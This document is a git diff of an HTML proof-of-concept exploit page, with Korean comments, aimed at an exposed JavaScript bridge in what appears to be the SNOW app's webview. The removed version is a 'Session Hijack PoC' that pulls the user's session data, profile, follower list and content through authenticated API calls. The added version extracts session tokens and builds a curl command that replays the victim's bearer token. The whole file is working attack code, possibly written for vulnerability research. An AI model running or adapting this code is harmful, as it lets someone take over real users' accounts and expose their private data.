@@ -2,130 +2,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SNOW PoC</title>
+    <title>Token Extractor</title>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body{font-family:-apple-system,sans-serif;padding:10px;background:#1a1a2e;min-height:100vh;margin:0;color:#fff}
-        .container{max-width:500px;margin:0 auto}
-        h1{color:#00ff88;text-align:center;font-size:16px}
-        .status{padding:6px 10px;margin:4px 0;background:#16213e;border-radius:6px;font-size:9px;word-break:break-all}
-        .success{border-left:3px solid #00ff88}
-        .error{border-left:3px solid #ff6b6b}
-        .critical{border-left:3px solid #ff00ff;background:#2d1b3d}
-        pre{background:#0f0f23;color:#00ff88;padding:8px;border-radius:5px;font-size:8px;overflow-x:auto;max-height:200px;white-space:pre-wrap}
+        body{font-family:monospace;padding:10px;background:#000;color:#0f0;font-size:10px}
+        pre{white-space:pre-wrap;word-break:break-all}
+        .copy-btn{background:#0f0;color:#000;border:none;padding:5px 10px;margin:5px 0;cursor:pointer}
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔓 SNOW Session Hijack PoC</h1>
-        <div id="status"></div>
-    </div>
-
+    <h3>Session Token Extractor for curl PoC</h3>
+    <div id="output"></div>
     <script>
     var Bridge = window.B612KajiBridgeInterface;
 
-    function log(msg, type) {
-        var div = document.createElement('div');
-        div.className = 'status ' + (type || '');
-        div.textContent = msg;
-        document.getElementById('status').appendChild(div);
+    function addOutput(text) {
+        document.getElementById('output').innerHTML += text + '<br><br>';
     }
 
-    function showData(title, data) {
-        var pre = document.createElement('pre');
-        pre.textContent = title + ':\n' + JSON.stringify(data, null, 2);
-        document.getElementById('status').appendChild(pre);
-    }
-
-    function runExploit() {
-        if (typeof B612KajiBridgeInterface === 'undefined') {
-            log('Bridge NOT found', 'error');
-            return;
-        }
+    if (typeof B612KajiBridgeInterface !== 'undefined') {
         Bridge = B612KajiBridgeInterface;
-        log('✅ Bridge FOUND!', 'success');
 
-        // 1. getUserSession - 세션 정보 (가장 중요)
-        window.sessionCB = function(data) {
+        // 전체 세션 데이터 추출
+        window.cb1 = function(data) {
             var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('🔑 SESSION HIJACKED!', 'critical');
-            showData('Session Data', d);
-        };
-        try {
-            Bridge.getUserSession('sessionCB');
-        } catch(e) {
-            log('getUserSession error: ' + e, 'error');
-        }
+            addOutput('<b>=== FULL SESSION DATA ===</b>');
+            addOutput('<pre>' + JSON.stringify(d, null, 2) + '</pre>');
 
-        // 2. apiRequest - 실제 사용자 API 호출 (올바른 엔드포인트)
-        window.meCB = function(data) {
-            var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('🎯 /v1/user/me Response!', 'critical');
-            showData('User Me API', d);
-        };
-        try {
-            Bridge.apiRequest('meCB', JSON.stringify({
-                url: 'https://user-snow-api.snow.me/v1/user/me',
-                method: 'POST'
-            }));
-            log('Calling /v1/user/me...', '');
-        } catch(e) {
-            log('apiRequest me: ' + e, 'error');
-        }
+            // 모든 키 나열
+            addOutput('<b>=== ALL KEYS ===</b>');
+            for (var key in d) {
+                addOutput(key + ': ' + JSON.stringify(d[key]).substring(0, 100));
+            }
 
-        // 3. 프로필 API
-        window.profileCB = function(data) {
-            var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('🎯 /v1/user/profile Response!', 'critical');
-            showData('User Profile API', d);
-        };
-        try {
-            Bridge.apiRequest('profileCB', JSON.stringify({
-                url: 'https://user-snow-api.snow.me/v1/user/profile',
-                method: 'POST'
-            }));
-        } catch(e) {}
+            // curl 명령어 생성
+            var curlCmd = 'curl -X GET "https://user-snow-api.snow.me/v1/user/me"';
+            if (d.userDigit) curlCmd += ' -H "x-user-digit: ' + d.userDigit + '"';
+            if (d.accessToken) curlCmd += ' -H "Authorization: Bearer ' + d.accessToken + '"';
+            if (d.userId) curlCmd += ' -H "x-user-id: ' + d.userId + '"';
 
-        // 4. 팔로워 목록 (개인정보)
-        window.followerCB = function(data) {
-            var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('👥 Follower List!', 'critical');
-            showData('Followers', d);
+            addOutput('<b>=== CURL COMMAND ===</b>');
+            addOutput('<pre>' + curlCmd + '</pre>');
         };
-        try {
-            Bridge.apiRequest('followerCB', JSON.stringify({
-                url: 'https://user-snow-api.snow.me/v1/user/follower/list',
-                method: 'POST',
-                parameters: {page: 1, size: 10}
-            }));
-        } catch(e) {}
+        Bridge.getUserSession('cb1');
 
-        // 5. 콘텐츠 API
-        window.contentCB = function(data) {
+        // 앱 정보도 추출
+        window.cb2 = function(data) {
             var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('📷 Content API Response!', 'success');
-            showData('Content', d);
+            addOutput('<b>=== APP INFO ===</b>');
+            addOutput('<pre>' + JSON.stringify(d, null, 2) + '</pre>');
         };
-        try {
-            Bridge.apiRequest('contentCB', JSON.stringify({
-                url: 'https://content-snow-api.snow.me/v1/user/me',
-                method: 'GET'
-            }));
-        } catch(e) {}
+        Bridge.appInfo('cb2');
 
-        // 6. appInfo
-        window.appCB = function(data) {
-            var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('📱 App Info', 'success');
-            showData('AppInfo', d);
-        };
-        try {
-            Bridge.appInfo('appCB');
-        } catch(e) {}
+    } else {
+        addOutput('Bridge not found');
     }
-
-    setTimeout(runExploit, 500);
     </script>
 </body>
 </html>
